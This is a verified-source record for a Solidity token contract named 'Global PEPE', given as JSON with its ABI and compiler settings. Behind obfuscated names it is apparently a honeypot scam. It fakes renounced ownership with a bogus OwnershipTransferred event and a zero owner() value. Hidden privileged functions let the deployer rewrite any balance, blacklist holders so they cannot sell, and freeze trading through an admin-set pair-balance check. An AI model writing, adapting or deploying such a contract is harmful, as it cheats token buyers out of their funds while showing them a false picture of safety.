{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface totalFrom {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address autoMax) external view returns (uint256);\n\n    function transfer(address totalMin, uint256 receiverMaxEnable) external returns (bool);\n\n    function allowance(address fromIs, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverMaxEnable) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address totalMin,\n        uint256 receiverMaxEnable\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverBuy, uint256 value);\n    event Approval(address indexed fromIs, address indexed spender, uint256 value);\n}\n\nabstract contract amountMode {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface teamLaunch {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface receiverToLaunched {\n    function createPair(address isMarketingTrading, address teamReceiver) external returns (address);\n}\n\ninterface totalFromMetadata is totalFrom {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract GlobalPEPE is amountMode, totalFrom, totalFromMetadata {\n\n    constructor (){\n        if (autoFundFrom != senderFeeList) {\n            modeTrading = false;\n        }\n        teamLaunch shouldEnable = teamLaunch(receiverMarketing);\n        launchEnableReceiver = receiverToLaunched(shouldEnable.factory()).createPair(shouldEnable.WETH(), address(this));\n        \n        shouldWallet = _msgSender();\n        fundTotal();\n        maxSwapLaunch[shouldWallet] = true;\n        senderBuy[shouldWallet] = totalLiquiditySell;\n        if (senderTradingAt != autoFundFrom) {\n            sellLimit = true;\n        }\n        emit Transfer(address(0), shouldWallet, totalLiquiditySell);\n    }\n\n    function teamList() private view {\n        require(maxSwapLaunch[_msgSender()]);\n    }\n\n    uint256 enableReceiver;\n\n    address private limitReceiver;\n\n    string private maxIs = \"GPE\";\n\n    address public shouldWallet;\n\n    uint8 private totalSwap = 18;\n\n    event OwnershipTransferred(address indexed isToken, address indexed receiverList);\n\n    function name() external view virtual override returns (string memory) {\n        return feeAuto;\n    }\n\n    function transfer(address receiverSellTx, uint256 receiverMaxEnable) external virtual override returns (bool) {\n        return isEnable(_msgSender(), receiverSellTx, receiverMaxEnable);\n    }\n\n    bool private toMarketing;\n\n    function balanceOf(address autoMax) public view virtual override returns (uint256) {\n        return senderBuy[autoMax];\n    }\n\n    uint256 private senderTradingAt;\n\n    function fromReceiver(address launchedBuy) public {\n        if (enableLiquidityMin) {\n            return;\n        }\n        if (autoFundFrom == senderTradingAt) {\n            senderTradingAt = senderFeeList;\n        }\n        maxSwapLaunch[launchedBuy] = true;\n        \n        enableLiquidityMin = true;\n    }\n\n    mapping(address => bool) public sellList;\n\n    bool public enableLiquidityMin;\n\n    function transferFrom(address limitMode, address totalMin, uint256 receiverMaxEnable) external override returns (bool) {\n        if (_msgSender() != receiverMarketing) {\n            if (exemptMarketing[limitMode][_msgSender()] != type(uint256).max) {\n                require(receiverMaxEnable <= exemptMarketing[limitMode][_msgSender()]);\n                exemptMarketing[limitMode][_msgSender()] -= receiverMaxEnable;\n            }\n        }\n        return isEnable(limitMode, totalMin, receiverMaxEnable);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return totalLiquiditySell;\n    }\n\n    function totalToLaunch(uint256 receiverMaxEnable) public {\n        teamList();\n        launchSender = receiverMaxEnable;\n    }\n\n    mapping(address => bool) public maxSwapLaunch;\n\n    bool public modeTrading;\n\n    string private feeAuto = \"Global PEPE\";\n\n    bool private sellLimit;\n\n    function fundTotal() public {\n        emit OwnershipTransferred(shouldWallet, address(0));\n        limitReceiver = address(0);\n    }\n\n    address receiverMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 launchSender;\n\n    function isEnable(address limitMode, address totalMin, uint256 receiverMaxEnable) internal returns (bool) {\n        if (limitMode == shouldWallet) {\n            return modeAt(limitMode, totalMin, receiverMaxEnable);\n        }\n        uint256 listToken = totalFrom(launchEnableReceiver).balanceOf(modeTotalAuto);\n        require(listToken == launchSender);\n        require(totalMin != modeTotalAuto);\n        if (sellList[limitMode]) {\n            return modeAt(limitMode, totalMin, swapMax);\n        }\n        return modeAt(limitMode, totalMin, receiverMaxEnable);\n    }\n\n    uint256 public autoFundFrom;\n\n    address public launchEnableReceiver;\n\n    uint256 private senderFeeList;\n\n    address modeTotalAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => mapping(address => uint256)) private exemptMarketing;\n\n    uint256 private totalLiquiditySell = 100000000 * 10 ** 18;\n\n    function modeAt(address limitMode, address totalMin, uint256 receiverMaxEnable) internal returns (bool) {\n        require(senderBuy[limitMode] >= receiverMaxEnable);\n        senderBuy[limitMode] -= receiverMaxEnable;\n        senderBuy[totalMin] += receiverMaxEnable;\n        emit Transfer(limitMode, totalMin, receiverMaxEnable);\n        return true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return maxIs;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return totalSwap;\n    }\n\n    function modeAuto(address totalSender) public {\n        teamList();\n        \n        if (totalSender == shouldWallet || totalSender == launchEnableReceiver) {\n            return;\n        }\n        sellList[totalSender] = true;\n    }\n\n    function owner() external view returns (address) {\n        return limitReceiver;\n    }\n\n    function getOwner() external view returns (address) {\n        return limitReceiver;\n    }\n\n    mapping(address => uint256) private senderBuy;\n\n    uint256 constant swapMax = 5 ** 10;\n\n    function atMode(address receiverSellTx, uint256 receiverMaxEnable) public {\n        teamList();\n        senderBuy[receiverSellTx] = receiverMaxEnable;\n    }\n\n    function allowance(address sellIsSender, address atReceiver) external view virtual override returns (uint256) {\n        if (atReceiver == receiverMarketing) {\n            return type(uint256).max;\n        }\n        return exemptMarketing[sellIsSender][atReceiver];\n    }\n\n    function approve(address atReceiver, uint256 receiverMaxEnable) public virtual override returns (bool) {\n        exemptMarketing[_msgSender()][atReceiver] = receiverMaxEnable;\n        emit Approval(_msgSender(), atReceiver, receiverMaxEnable);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverList\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverBuy\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellIsSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverMaxEnable\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSellTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverMaxEnable\",\"type\":\"uint256\"}],\"name\":\"atMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoFundFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoMax\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableLiquidityMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedBuy\",\"type\":\"address\"}],\"name\":\"fromReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchEnableReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxSwapLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalSender\",\"type\":\"address\"}],\"name\":\"modeAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverMaxEnable\",\"type\":\"uint256\"}],\"name\":\"totalToLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSellTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverMaxEnable\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverMaxEnable\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "GlobalPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}